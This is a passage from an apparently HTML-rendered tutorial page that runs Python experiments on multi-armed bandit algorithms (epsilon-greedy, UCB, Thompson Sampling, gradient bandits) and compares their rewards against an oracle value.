para <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_Gradient<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_gradient <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>Gradient<span class="token punctuation">,</span>para<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"$para$"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of Gradient Bandit ALgorithm is {:.4f} (para {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_Gradient<span class="token punctuation">,</span>max_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_gradient<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/f3/0a/tYOYJ5U2_o.png" alt="在这里插入图片描述"></p> 
<ol start="5"><li>we test <strong>Parameterized Gradient Bandit</strong> with constant parameter <span class="katex--inline"><span class="katex"><span class="katex-mathml">
     
      
       
        
         β
        
        
         =
        
        
         0.2
        
        
         ,
        
        
         1
        
        
         ,
        
        
         2
        
        
         ,
        
        
         5
        
       
       
        beta = 0.2, 1, 2, 5
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">5</span></span></span></span></span>.</li></ol> 
<pre><code class="prism language-python"><span class="token comment"># parameter list:[step_size, baseline, beta] (default: baseline = mean(R_t), step_size = 0.1)</span>
step_size <span class="token operator">=</span> <span class="token number">0.1</span>
para <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_Para_Gradient_const<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_para_const <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>Gradient<span class="token punctuation">,</span>para<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"$para$"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of Parameterized Gradient Bandit Algorithm (beta is a constant) is {:.4f} (para {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_Para_Gradient_const<span class="token punctuation">,</span>max_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_para_const<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c0/db/gzYF3P8o_o.png" alt="在这里插入图片描述"></p> 
<ol start="6"><li> <p>we test <strong>Parameterized Gradient Bandit</strong> with time-varying parameters <span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           β
          
          
           t
          
         
         
          =
         
         
          l
         
         
          o
         
         
          g
         
         
          (
         
         
          t
         
         
          )
         
        
        
         beta_t = log(t)
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right: 0.03588em">g</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span>.</p> <p>We choose <span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          
           β
          
          
           t
          
         
         
          =
         
         
          l
         
         
          o
         
         
          g
         
         
          (
         
         
          t
         
         
          )
         
        
        
         beta_t = log(t)
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right: 0.03588em">g</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span> as the time-varying parameter because we want to find a monotonically increasing function so that when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          t
         
        
        
         t
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span></span></span></span></span> is small, the model takes more exploration process, and when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          t
         
        
        
         t
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span></span></span></span></span> is large, the model will have more exploitation process.</p> </li></ol> 
<pre><code class="prism language-python"><span class="token comment"># parameter list:[step_size, baseline, beta] (default: baseline = mean(R_t), step_size = 0.1)</span>
step_size <span class="token operator">=</span> <span class="token number">0.1</span>
para <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>step_size<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_Para_Gradient_func<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_para_func <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>Gradient<span class="token punctuation">,</span>para<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"$para$"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of Parameterized Gradient Bandit Algorithm (beta is a time-varying function) is {:.4f} (para {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_Para_Gradient_func<span class="token punctuation">,</span>max_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_para_func<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/82/fb/SeHDoMB4_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="Step_3_Results_and_Explanations_622"></a>Step 3: Results and Explanations</h3> 
<h4>
<a id="1_The_performance_of_the_three_algorithms_623"></a>1. The performance of the three algorithms</h4> 
<p>Therefore, we compute the oracle value and the expectation rewards of the three respectively:</p> 
<pre><code class="prism language-python"><span class="token comment"># Compute the oracle value over N = 5000 turns</span>

arm_mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.9</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">]</span>
<span class="token comment"># number of slots </span>
N <span class="token operator">=</span> <span class="token number">5000</span>
<span class="token comment"># number of experiments</span>
num_exper <span class="token operator">=</span> <span class="token number">1000</span>

oracle_value<span class="token punctuation">,</span>max_i <span class="token operator">=</span> Oracle<span class="token punctuation">(</span>arm_mean<span class="token punctuation">,</span>N<span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The oracle value:"</span><span class="token punctuation">,</span>oracle_value<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Expectation of epsilon-Greedy: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_greedy<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Expectation of UCB: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_UCB<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Expectation of Thompson: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_TS<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Expectation of Gradient Bandit: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_Gradient<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/44/e1/jkjscz9i_o.png" alt="在这里插入图片描述"></p> 
<p>And then we can calculate the gap between the expectation rewards of each algorithm and the oracle value:</p> 
<pre><code class="prism language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Gap between epsilon-Greedy and the oracle value: {:.4f}"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_greedy<span class="token operator">-</span>oracle_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Gap between UCB and the oracle value: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_UCB<span class="token operator">-</span>oracle_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Gap between Thompson and the oracle value: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_TS<span class="token operator">-</span>oracle_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Gap between Gradient Bandit and the oracle value: {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_Gradient<span class="token operator">-</span>oracle_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c1/bf/nwPS0PGg_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Percantage of optimal arm of epsion-Greedy: {:.4f}"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_greedy<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Percantage of optimal arm of UCB: {:.4f}"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_UCB<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Percantage of optimal arm of TS: {:.4f}"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_TS<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Percantage of optimal arm of Gradient: {:.4f}"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_gradient<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/a4/5b/Ct7OHaFX_o.png" alt="在这里插入图片描述"></p> 
<p>From the result above, we can find that the <strong>Thompson Sampling</strong> has the least gap between the oracle value, the largest cumulative reward and the largest percentage of optimal arm. So, Thompson Sampling is the best among the three algorithm.</p> 
<p>And we can also use the graphs to compare the performance of the three algorithm:</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">compare</span><span class="token punctuation">(</span>algorithm<span class="token punctuation">,</span> para<span class="token punctuation">,</span> arms<span class="token punctuation">,</span> num_exper<span class="token punctuation">,</span> num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>

    fig<span class="token punctuation">,</span>axes <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    cumulative_reward <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>algorithm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> Greedy <span class="token keyword">or</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> UCB<span class="token punctuation">:</span>
            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> Greedy<span class="token punctuation">)</span><span class="token punctuation">:</span>
                algo_name <span class="token operator">=</span> <span class="token string">"Greedy"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                algo_name <span class="token operator">=</span> <span class="token string">"UCB"</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cum_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cum_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            cumulative_reward<span class="token punctuation">[</span>algo_name<span class="token punctuation">]</span> <span class="token operator">=</span> cum_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">elif</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> TS<span class="token punctuation">:</span>
            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            algo_name <span class="token operator">=</span> <span class="token string">"TS"</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cum_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            
            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cum_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            cumulative_reward<span class="token punctuation">[</span>algo_name<span class="token punctuation">]</span> <span class="token operator">=</span> cum_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">elif</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> Gradient<span class="token punctuation">:</span>
            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algorithm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> para<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            algo_name <span class="token operator">=</span> <span class="token string">"Gradient"</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cum_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            
            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cum_reward<span class="token punctuation">,</span>label<span class="token operator">=</span>algo_name<span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            cumulative_reward<span class="token punctuation">[</span>algo_name<span class="token punctuation">]</span> <span class="token operator">=</span> cum_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    optimal_algo <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>cumulative_reward<span class="token punctuation">,</span> key<span class="token operator">=</span>cumulative_reward<span class="token punctuation">.</span>get<span class="token punctuation">)</span>
